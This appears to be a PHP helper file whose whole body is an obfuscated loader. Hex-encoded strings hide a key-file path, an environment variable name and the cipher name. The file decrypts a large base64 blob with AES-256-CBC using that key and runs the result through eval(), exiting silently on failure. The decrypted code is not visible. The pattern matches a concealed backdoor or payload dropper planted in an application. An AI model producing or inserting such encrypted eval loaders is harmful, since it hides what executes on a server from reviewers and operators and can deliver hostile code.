<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('ze4r+LQy9g340rM0PS3+QA==');

$c=base64_decode(

'pW33UOf6h7TMXkl+vnFyTd69xxwruav6AenfkeTpBUOTq3zjW6FvPlP5G+Ul0wsOrh+5EfrK6OaT' .
'YoovozVrm75LBNpaW67cFTp3DHqroGv9cmfXhlXOxYAowWU5JWxyIrmLFfIfQRJOijeTe7iKB/s2' .
'9b0aCiwpkJmiNNR9xqC1HAq+JnicvF3HU3sPZRP0OCGazfIgl6pZkfOQ7lwlDg1Z+7x2/vHkr6dm' .
'r7pULxSOzcvK2L2c5aTqMHhstv3CvW75cDaK67uOoxE9OY1Zu1TNszzf2GEr6uXbtjD1PCGn3Syy' .
'OVw+J7KvoFR31YtLu9+Y3IODTdBnRsRKzeiLwNScWmkexsX0gINKqaNYW42LLdiZ9JVsGkWEXUKk' .
'sxWks8Ar/YHD08NxEyVhTjBfA5b4hREs3KsPuRdIC2hjC6I0cl58bOMFTXvHTksZu6t6m958px/5' .
'Ei6pEmzC/+JhWlbtnxcGZoXAFY8lIYhvlHZAZCJpV4ClZo6SFhssCnJWIyCNredAEWPgAxyhInUH' .
'MgxuljvCVBya/smhGZmSa6QFuM5k9z16Kk1qf5/rg5TkGXu6XthAE9xC9F8/V0rTw+m1sWWt8QIy' .
'0L5L1+SqDwfUOTGDeG7ayy/Q153mwFGQsYQwujcAG1hEfuc8x7YNV4KiWoLS3J9IvALPs9PLVzbt' .
'mUiyB4BWGTgOw2/GPQJUtbdL+nHK7AmvUBYJ+rinDL0H9UervjqfBxkAmZYq2W5LUfev4xUqak95' .
'lVic+rykkUfMGNLAyuBTlE5ViKxtocvamFPwkfsysasHiEuUmCyBGEoBy7sjrgi2ypOOZubEfwmV' .
'E+3WgumOFQ87ej3iyEoeXP/30bAHwq0lQyaYYGrQjDXWR7NvBFlF0E4MQ+M7cZTgVXthcueBkNbL' .
'CidYZq+56OCck6VEjGiQQAPE/UrCLD2qWea/+7CPRPgtDQRQByoMUixABkLIFA/K5rDd411Sq6Fp' .
'B/ZObXtjVbrDLkAuj0XZ/p7D0lI9Bl1j1aTvNFaT8x4bTjvuQDliYHw3D1q6s7EH5IaAd/qA5f0X' .
's/S9ZCpF+PWbh4tSOyERQdTXxwiCPOr0RHs+DqU4mbPYhkeQbvffBQ7bWSWQsfojhKwhQQ3++LSm' .
'//8l9zHY7XyFCkx0v375afow1JAj3o9EcnXVaRZvY8v4eiMXiBDrT4xyIT45TQXs10BebfMoPSAv' .
'cwFKXfrhykH7Kov3px8xColStP7iHB7ABW6ild6PB7X/zZvQSQL5YnKnpnvX8EEFS/WXPcpoIMBP' .
'r4neg317yBylr+7nna5o/HdZ/w7jaUnbnY1B7hnU2m9caAUL5WcqI2L8s66zJ/B3s7zaoASAAGbg' .
'0p8xf0hbuRBNSABvGNUqiPLIGDG2ZbsUzuqaRYfjPamKeQFfCNYixq4/jkkaoznbcrc4r8PiWFB0' .
'VzxOGdJU5NlvTKBa+XI80I41qetX1ew3iYrtFUYfSHtiHjwtkP+k2hbqsEaUV5ktkwxbjAcO0nk8' .
'9rdrxjX0vQKlevdRyODyFPBX0bINKZezY3HDaouZLkP3a7pNIAcmclFmZsnnQebvW5kBBoR1qh6E' .
'BaxHlrrv+lNFKwsSoHonbUm/e5ZWdsDHcnvQpsJmgIXCwsRmJCBWQ7uc0z9cIJ1Pduu8cWLn5n7N' .
'8bfDPhtpwkEqhWybt1Bp9sI5c4HrHicxm4YeRqKIl/CfljI09GtK+Cw0S0x928kpyOa/eZoYzRlo' .
'f6c+c4RooZGEXIwjOfgVeHNUMXIptpF5Oh/OaqanOfa6z052PO4vZOrhUfvIaUvU0L0hNmNaHYwS' .
'zCGB/ruJ8+joRde6aVwTriI2hG3DO3gtwS9GnhqqxMDESGM0JUhjXcb0zITweqjvMUzGd8uS8k+3' .
'KAXxRoj2/duMZkbvV/6VUemYRkMXnICSgA4VKRVCI3YtOKambFZCNvB5lraToUqoRGivPvgcvAJO' .
'H1WOdjDC0xx2BoIDIgmTkTNtT9N74lf/U3oSrdWCCpaIus3SXMftJiVSEukyTTDtdBB1pKMPwn7e' .
'GlintHLqdk4za1TC3bAVLTL0nZiGujffOWMP1UfqmTkk1mcON4Lrxm13ffnteovIi0byuljzQJ/E' .
'Aapm6SMBal9F9w3HUmm4w+ItzRqDy5onQZywwB3COuwHvSxU'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

